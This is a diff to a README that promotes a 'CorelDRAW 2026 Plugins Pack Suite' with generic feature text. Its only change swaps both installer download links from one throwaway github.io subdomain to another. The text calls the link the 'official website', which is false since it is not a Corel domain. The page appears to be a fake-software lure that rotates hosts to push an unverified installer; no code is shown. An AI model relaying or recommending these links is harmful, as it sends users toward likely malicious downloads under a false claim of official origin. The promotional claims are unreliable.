@@ -2,7 +2,7 @@
 
 The CorelDRAW 2026 Plugins Pack Suite is an extensive toolkit designed to elevate your CorelDRAW experience by providing a diverse array of plugins, brushes, effects, and templates. This suite is perfect for designers seeking to expand their creative possibilities with high-quality, easy-to-use additions that integrate seamlessly into the CorelDRAW environment.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -47,6 +47,6 @@ A: While the suite provides a wide range of pre-made brushes, it includes tools 
 
 To get started with the CorelDRAW 2026 Plugins Pack Suite, download the installer from the link below. This will provide you with the latest version and ensure you have all the necessary files for a smooth installation.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 The CorelDRAW 2026 Plugins Pack Suite is designed to enhance your productivity and creativity, offering a robust set of tools that integrate seamlessly into your workflow. Whether you're a seasoned professional or a beginner, this suite provides the resources to take your designs to the next level. Regular updates and a user-friendly installation process make it a valuable addition to any designer's toolkit. For support or more information, visit the documentation or contact the development team through the GitHub repository. Start exploring the possibilities today and unlock the full potential of CorelDRAW with this comprehensive plugins pack.
